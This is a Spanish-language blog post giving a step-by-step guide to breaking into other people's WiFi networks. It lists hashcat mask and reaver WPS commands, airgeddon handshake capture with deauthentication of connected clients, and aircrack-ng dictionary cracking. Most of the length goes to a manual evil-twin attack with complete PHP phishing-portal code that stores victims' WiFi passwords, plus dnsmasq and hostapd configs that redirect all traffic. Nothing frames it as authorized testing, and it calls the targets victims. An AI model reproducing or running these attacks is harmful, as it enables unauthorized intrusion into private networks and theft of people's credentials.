<!DOCTYPE html>
<html lang="es">





<head>
  <meta property="og:url" content="https://imlauera.github.io/post/atacando_wifis/">
  <meta property="og:site_name" content="Imlauer">
  <meta property="og:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
  <meta property="og:description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
No te hace falta usar espacio de disco almacenando diccionarios. Abris un simple .txt en blanco y dentro le pones
004?d?d?d?d?d?d?d 014?d?d?d?d?d?d?d Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000 004y014mas7.hcmask -w Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.">
  <meta property="og:locale" content="es_es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-07-21T19:48:09-03:00">
    <meta property="article:modified_time" content="2024-07-21T19:48:09-03:00">
    <meta property="article:tag" content="Atacando">
    <meta property="article:tag" content="Redes">
    <meta property="article:tag" content="Ciberseguridad">
    <meta property="article:tag" content="Vulnerabilidades">

  
  <meta itemprop="name" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
  <meta itemprop="description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
No te hace falta usar espacio de disco almacenando diccionarios. Abris un simple .txt en blanco y dentro le pones
004?d?d?d?d?d?d?d 014?d?d?d?d?d?d?d Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000 004y014mas7.hcmask -w Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.">
  <meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00">
  <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00">
  <meta itemprop="wordCount" content="4252">
  <meta itemprop="keywords" content="Atacando,Redes,Ciberseguridad,Vulnerabilidades">
  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
  <meta name="twitter:description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
No te hace falta usar espacio de disco almacenando diccionarios. Abris un simple .txt en blanco y dentro le pones
004?d?d?d?d?d?d?d 014?d?d?d?d?d?d?d Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000 004y014mas7.hcmask -w Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.">

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>
    
    Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.
    
  </title>
  <link rel="stylesheet" href='https://imlauera.github.io/css/site.min.css'>
  <link rel="canonical" href="https://imlauera.github.io/post/atacando_wifis/">
  <link rel="alternate" type="application/rss&#43;xml" href="https://imlauera.github.io/index.xml" title="Imlauer">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="no-referrer">
  <meta name="author" content="Imlauer.">
  <meta name="description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.

No te hace falta usar espacio de disco almacenando diccionarios.
Abris un simple .txt en blanco y dentro le pones
004?d?d?d?d?d?d?d
014?d?d?d?d?d?d?d
Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000  004y014mas7.hcmask -w

Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
es para cualquier distro.">
</head>
<body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
    <a class="navbar-item" href="https://imlauera.github.io/">
      <figure class="image">
        <img alt="" class="is-rounded" src="/img/memememe.jpg">
      </figure>
    </a>
    <a class="navbar-item" href="https://imlauera.github.io/">
      Imlauer
    </a>
    <a class="navbar-item" href="/acerca/">
      Acerca de Mi
    </a>
  </div>
  
  
</nav>

  <section>
    <section class='hero is-small is-link is-fullwidth'>
      <div class="hero-body">
<div class="container">
  <h1 class="title">
    Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.
  </h1>
  <h2 class="subtitle">
    <time datetime='2024-07-21T19:48:09-03:00'>
      July 21, 2024
    </time>
    
    <br>
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/atacando/">Atacando</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/redes/">Redes</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/ciberseguridad/">Ciberseguridad</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/vulnerabilidades/">Vulnerabilidades</a>
    
    
    
  </h2>
</div>

      </div>
    </section>
    <section class="section">
      <div class="container">
<div class="content is-medium">
  <p>Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.</p>
<hr>
<p>No te hace falta usar espacio de disco almacenando diccionarios.
Abris un simple .txt en blanco y dentro le pones</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>004?d?d?d?d?d?d?d
</span></span><span style="display:flex;"><span>014?d?d?d?d?d?d?d
</span></span></code></pre></div><p>Lo guardas como <code>004y014mas7.hcmask</code>. Despues solo resta correr hashcat.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -O --markov-threshold<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">22000</span> -a <span style="color:#ae81ff">3</span> mi_hash.HC22000  004y014mas7.hcmask -w
</span></span></code></pre></div><hr>
<p>Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
es para cualquier distro.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo reaver -i wlan0 -b mac_address -c canal -K <span style="color:#ae81ff">1</span> -Z -vvv
</span></span></code></pre></div><p>Si te falla pasamos a:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d <span style="color:#ae81ff">10</span> -r 3:15 -T .5 -vv
</span></span></code></pre></div><p>Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.</p>
<p>Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.</p>
<hr>
<p><a href="https://github.com/Ragnt/AngryOxide">https://github.com/Ragnt/AngryOxide</a></p>
<p>User Guide: <br>
<a href="https://github.com/Ragnt/AngryOxide/wiki/1.-User-Guide">https://github.com/Ragnt/AngryOxide/wiki/1.-User-Guide</a></p>
<p>Es tremendamente explicativa la wiki, como se lanza, las opciones a ejecutar, etc.</p>
<p>Yo lo dejo corriendo mínimo media hora, mientras va creando un archivo pcapng con el
nombre que le hemos asignado, los .hc22000 validos conseguidos y un file .kismet.
Para cortarlo presionamos q y los comprime en un solo .tar.gz. Si el pcapng supera
los 100 mb, automaticamente comprime ese pero sigue creando uno nuevo.
pero nada de otro mundo.</p>
<hr>
<h4 id="airgeddon-captura-handshakes-rotos-es-mejor-usar-hcxdumptool">Airgeddon captura handshakes rotos es mejor usar hcxdumptool</h4>
<p>Quizás en un futuro mejore, pero hasta ahora es así.</p>
<p>Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch.
Instalá wifite, airgeddon, fluxion.</p>
<p>Si querés usar airgeddon sin interfaz gráfica:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>export AIRGEDDON_WINDOWS_HANDLING<span style="color:#f92672">=</span>tmux
</span></span><span style="display:flex;"><span>airgeddon
</span></span></code></pre></div><p>Más info acá: <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options">https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options</a></p>
<pre tabindex="0"><code>sudo wifite
sudo airgeddon
</code></pre><p>Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:</p>
<p>crunch 10 10 0123456789 hex -o START -t sakura@@@@</p>
<p>Y luego usarlos con aircrack como se demuestra más abajo.</p>
<hr>
<p>Primero de todo: <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ-&amp;-Troubleshooting">Problemas comunes con airgeddon</a></p>
<h3 id="puede-ser-que-tu-tarjeta-de-red-no-soporte-el-tipo-de-ataque-gemelo-malvado-porque-tiene-que-ser-capaz-de-dividir-la-tarjeta-fisica-en-2-tarjetas-logicas-como-se-explica-acá">Puede ser que tu tarjeta de red no soporte el tipo de ataque &ldquo;gemelo malvado&rdquo; porque tiene que ser capaz de &ldquo;dividir&rdquo; la tarjeta fisica en 2 tarjetas logicas como se explica acá:</h3>
<h1 id="qué-es-vif">¿Qué es VIF?</h1>
<p>VIF (Interfaz virtual) es la capacidad de dividir una tarjeta física en 2 tarjetas lógicas. Esto se utiliza durante los ataques de Evil Twin para que uno actúe como AP y el otro realice DoS en modo monitor. Desde airgeddon&gt;=10.42 hay un control integrado para esto antes de lanzar cualquier ataque de Evil Twin.</p>
<p>Para verificar manualmente si su tarjeta es compatible con VIF, ejecute este comando <code>sudo iw list | grep &quot;Supported interface modes&quot; -A 8</code> (este comando distingue entre mayúsculas y minúsculas y si se escribe mal dará como resultado una salida incorrecta o ninguna) y debería ver en la salida AP/VLAN (solo AP no es suficiente), de lo contrario, su La tarjeta no admite el VIF requerido.</p>
<p>Por lo general, los conjuntos de chips Realtek (RTL) no tienen capacidad VIF y no se recomiendan para piratería inalámbrica. No los confunda con los conjuntos de chips Ralink (RT), estos últimos suelen ser compatibles y recomendados con VIF. Consulte la lista de chipsets/tarjetas compatibles con VIF en pleno funcionamiento <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards-and-Chipsets">acá</a>.</p>
<p>Si tiene más de una tarjeta wifi y ninguna admite VIF o es una tarjeta o chipset en la lista negra, pero al menos una admite el modo AP y ambas admiten el modo monitor, puede intentar usar este <a href="https://github.com/xpz3/airgeddonplugins/blob/main/multint.sh">plugin</a> para usar 2 tarjetas en airgeddon en lugar de una tarjeta compatible con VIF. . Uno para el AP falso y otro para realizar DoS. Puede encontrar información sobre el uso de complementos <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Plugins%20System">acá</a>.</p>
<p>Acá están las tarjetas en la lista negra: <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets">https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets</a></p>
<p>Obtené información de tu tarjeta de red con el siguiente comando: <code>lspci -nnk | grep -A2 0280</code> o <code>sudo lshw -C network</code></p>
<h3 id="1er-método-wps-attack-y-captura-de-handshake-con-wifite">1er método: WPS attack y captura de handshake con wifite</h3>
<p>Usando wifite lo hace todo automáticamente ejecuta ataques de WPS y captura el handshake y e intenta descubrir la contraseña con un diccionario, sólo tenés que elegir la red a atacar.</p>
<h3 id="2do-método-capturá-el-handshake-con-airgeddon">2do método: Capturá el handshake con airgeddon</h3>
<p>Capturá el handskake (el archivo que contiene la contraseña cifrada)</p>
<pre tabindex="0"><code>sudo airgeddon
</code></pre><h3 id="pasos">Pasos:</h3>
<ol>
<li>Seleccioná la interfaz wlan0</li>
<li>Ponela en modo monitor (2)</li>
<li>Ahora tenés la opción de capturar el handshake con la opcion 5 o hacer un ataque de gemelo malvado con la opcion 7. Para hacer el ataque del gemelo malvado necesitas capturar el handshake. Si selecionás la opción 7 lo hace todo en uno.</li>
<li>Vamos a capturar el handshake apretá 5.</li>
<li>Ponelo en monitor mode con 2 si te olvidaste de hacerlo en el paso anterior.</li>
<li>Dale a la opcion 6.</li>
<li>Ahí comenzará a escanear por redes, cuando veas la red que querés atacar cerrá la ventana con Alt+F4 , ahora los nombres que aparecen en amarillo son las redes que tienen clientes. Seleccioná cual red desees atacar.</li>
<li>Tenés que elegir el método para desautenticar al cliente, esto es necesario porque solo podemos capturar el handshake cuando el cliente se conecta al wifi, cuando ya está conectado no podemos hacerlo.
Elegí cualquiera de las 3, el que más me ha funcionado es la 1era opción: <code>deauth / disassoc amok mdk4 attack</code></li>
<li>Ahora sólo queda esperar, el handshake capturado se guardará en <code>/root/handshake-....cap</code>, luego necesitarás para hacer el ataque de gemelo malvado.</li>
</ol>
<p>Usá el diccionario rockyou.txt que viene en kalilinux o bajalo.</p>
<p>Si estás en kali ejecutá wordlists.
Y te tira el directorio en donde está rockyou.txt.gz tenes que descomprimirlo</p>
<p>Intentá descubrir la contraseña con un diccionario ejecutando este comando:</p>
<pre tabindex="0"><code>sudo aircrack-ng -w rockyou.txt /root/handshake-MAC.cap
</code></pre><h1 id="3er-método-wifiphisher-evil-twin">3er método: wifiphisher (Evil twin)</h1>
<p>Es todo automático. Crea un punto de acceso falso con el mismo nombre del wifi de la víctima para engañarlo haciéndola creer que su WiFi. Ejecutálo como root elegí el SSID y esperá a la victima. Es una técnica más de &ldquo;ingeniería social&rdquo; porque es como salir a pescar. Pero a diferencia de hacer un ataque de evil twin con airgeddon o fluxion no usa el handshake, el handshake se utiliza para verificar si la contraseña que te dió la víctima es correcta.</p>
<h1 id="4to-método-evil-twin-fluxion-o-airgeddon">4to método: Evil Twin (fluxion o airgeddon)</h1>
<p>El metodo gemelo malvado consiste en crear varias redes wifis con el mismo nombre deautentica al usuario y le hace creer que su internet no funciona te conectás a mi wifi creyendo que es la tuya y te tira un mensaje de que el firmware se está actualizando y te pido la contraseña, es un ataque más de ingeniería social. Pero funciona.
Este ataque se puede realizar con <code>fluxion</code> o con <code>airgeddon</code></p>
<h3 id="5to-método-lo-mismo-pero-en-vez-de-usar-scripts-lo-hacemos-todo-a-mano">5to método: Lo mismo pero en vez de usar scripts, lo hacemos todo a mano.</h3>
<h4 id="no-es-recomendado-porque-simultaneamente-tenés-que-hacer-un-ataque-dos-en-modo-monitor-y-levantar-un-punto-de-acceso-acá-no-te-enseñaré-como-hacerlo-en-simultáneo-para-eso-está-el-script-airgeddon-y-fluxion-quizás-sea-mejor-tener-dos-tarjetas-en-este-caso">NO ES RECOMENDADO. PORQUE SIMULTANEAMENTE TENÉS QUE HACER UN ATAQUE DoS EN MODO MONITOR Y LEVANTAR UN PUNTO DE ACCESO, ACÁ NO TE ENSEÑARÉ COMO HACERLO EN SIMULTÁNEO, PARA ESO ESTÁ EL SCRIPT AIRGEDDON Y FLUXION. Quizás sea mejor tener dos tarjetas en este caso.</h4>
<p>Instalá apache y bajo <code>/var/www/html</code> creá un archivo llamado <code>passwords.txt</code></p>
<p>index.php:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;button&#39;</span>])){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>])){
</span></span><span style="display:flex;"><span>			$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Please wait for validation of password key: &#39;</span><span style="color:#f92672">.</span>$password<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>			$fp <span style="color:#f92672">=</span><span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;passwords.txt&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fwrite</span>($fp, $password);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fwrite</span>($fp, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fclose</span>($fp);
</span></span><span style="display:flex;"><span>		}<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Wifi password cannot be empty&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;title&gt;Wifi Service&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    body{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      font-family: Arial, Helvetica, sans-serif;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      text-align: center;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      background-color:  #d5dbdb ;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      padding: 20px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    button{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		padding: 10px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	#connecting{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		visibility: hidden;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div id=&#34;password-form&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;img src=&#34;/wifi-icon3.png&#34; alt=&#34;&#34; width=&#34;180vw&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;p&gt;Your wifi key needs to be revalidated for security reasons.&lt;/p&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	  &lt;form method=&#34;post&#34; action=&#34;index.php&#34; id=&#34;mform&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;p&gt;Please enter your modem&#39;s WPA wifi key to connect to the Internet: &lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;input type=&#34;text&#34; name=&#34;password&#34; size=&#34;35%&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;p&gt;&lt;input type=&#34;submit&#34; name=&#34;button&#34;  value=&#34;Connect&#34;&gt;&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	  &lt;/form&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span></code></pre></div><p>Guardá este ícono con el mismo nombre en <code>/var/www/html</code></p>
<p><img src="/img/wifi-icon3.png" alt="/img/wifi-icon3.png">
Al archivo PHP llamalo index.php y dale permisos de escritura y lectura con <code>chmod -R 777 index.php</code></p>
<h3 id="ejecutá-el-servidor">Ejecutá el servidor.</h3>
<p><code>service apache2 start</code></p>
<p>La contraseña se guardará en <code>passwords.txt</code></p>
<p>Con <code>ip a</code> obtené tu dirección IP local.</p>
<h3 id="instalá-hostapd-y-dnsmasq">Instalá <code>hostapd</code> y <code>dnsmasq</code></h3>
<p><code>sudo apt install -y hostapd dnsmasq</code>
Usá estos archivos de configuración para el dnsmasq y el hostapd</p>
<h4 id="dnsmasqconf">dnsmasq.conf</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>#Set the wifi interface
</span></span><span style="display:flex;"><span>interface=wlan0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Set the IP range that can be given to clients
</span></span><span style="display:flex;"><span>dhcp-range=10.0.0.10,10.0.0.100,8h
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Set the gateway IP address
</span></span><span style="display:flex;"><span>dhcp-option=3,10.0.0.1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Set dns server address
</span></span><span style="display:flex;"><span>dhcp-option=6,10.0.0.1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Redirect all requests to 10.0.0.1
</span></span><span style="display:flex;"><span>address=/#/10.0.0.1
</span></span></code></pre></div><h4 id="hostapdconf">hostapd.conf</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>#Set wifi interface
</span></span><span style="display:flex;"><span>interface=wlan0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Set network name
</span></span><span style="display:flex;"><span>ssid=iot-lab
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Set channel
</span></span><span style="display:flex;"><span>channel=1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#Set driver
</span></span><span style="display:flex;"><span>driver=nl80211
</span></span></code></pre></div><h4 id="detenemos-el-servicio-de-network-manager">Detenemos el servicio de network manager</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>service network-manager stop <span style="color:#75715e"># En algunas distros es NetworkManager</span>
</span></span><span style="display:flex;"><span>airmong-ng check kill <span style="color:#75715e"># Para comprobar que fue detenido</span>
</span></span></code></pre></div><p>Con el dnsmasq vamos a redireccionar todo el tráfico a <code>10.0.0.1</code>.</p>
<h3 id="configuramos-para-que-nuestra-ip-sea-1000124">Configuramos para que nuestra ip sea 10.0.0.1/24</h3>
<p>Donde <code>/24</code> indica que los primeros 24 bits son bits de red, dejando los 8 bits restantes para direcciones de host dentro de ese bloque.</p>
<p>En la mayoría de distros ifconfig ya está obsoleto y tendrás que usar el comando <code>ip</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>ifconfig wlan0 10.0.0.1/24
</span></span><span style="display:flex;"><span>ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
</span></span></code></pre></div><p>Ejecutá ifconfig para comprobar que se guardó la configuración.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>route -n
</span></span><span style="display:flex;"><span>route add default gw 10.0.0.1 <span style="color:#75715e"># gw hace referencia a gateway</span>
</span></span><span style="display:flex;"><span>route -n <span style="color:#75715e"># Para confirmar que se agregó la ruta</span>
</span></span></code></pre></div><p>Ahora ejecutamos dnsmasq con el archivo de configuración mostrado anteriormente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dnsmasq -C /root/eviltwinfiles/dnsmasq.conf
</span></span></code></pre></div><p>Y creamos el punto de acceso WiFi.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hostapd /root/eviltwinfiles/hostapd.conf
</span></span></code></pre></div><p>Luego ejecutamos el servidor apache en donde contiene nuestro portal captivo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo us
</span></span><span style="display:flex;"><span>service apache start
</span></span></code></pre></div><p>Ahora si te conectás a la WiFi todos las contraseñas que ingresen a través de ese portal se guardaran en <code>passwords.txt</code></p>
<p>Cuando entres a tu WiFi falsa e intentes ingresar a gmail.com y facebook.com no te redireccionará a tu portal cautivo porque usan el protocolo HSTS.</p>
<h4 id="para-detener-el-ataque">Para detener el ataque:</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>service hostapd stop
</span></span><span style="display:flex;"><span>service dnsmasq stop
</span></span><span style="display:flex;"><span>service apache2 stop
</span></span><span style="display:flex;"><span>service rpcbind stop
</span></span><span style="display:flex;"><span>killall dnsmasq # o pkill dnsmasq
</span></span><span style="display:flex;"><span>killall hostapd # o pkill hostapd
</span></span><span style="display:flex;"><span>netstat -tan # Para confirmar que los servicios se hayan detenido.
</span></span></code></pre></div><h3 id="iniciar-networkmanager">Iniciar networkmanager</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>service network-manager start
</span></span></code></pre></div><p>Y listo ya deberías haber detenido el ataque y volver a tener internet.</p>
